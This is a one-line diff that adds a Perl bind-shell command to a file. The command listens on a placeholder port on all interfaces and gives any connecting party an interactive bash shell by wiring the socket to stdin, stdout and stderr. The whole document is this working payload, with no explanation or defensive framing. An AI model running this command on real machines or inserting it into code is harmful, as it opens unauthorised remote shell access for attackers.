@@ -1,0 +1,1 @@
+perl -e 'use Socket;$port=ATTACKER-PORT;socket(Sock, PF_INET, SOCK_STREAM, getprotobyname("tcp"));bind(Sock, sockaddr_in($port, INADDR_ANY));listen(Sock, SOMAXCONN);for(; $c = accept(C, Sock); close(Sock)){open(STDIN, ">&C");open(STDOUT, ">&C");open(STDERR, ">&C");exec("/bin/bash -i");};'
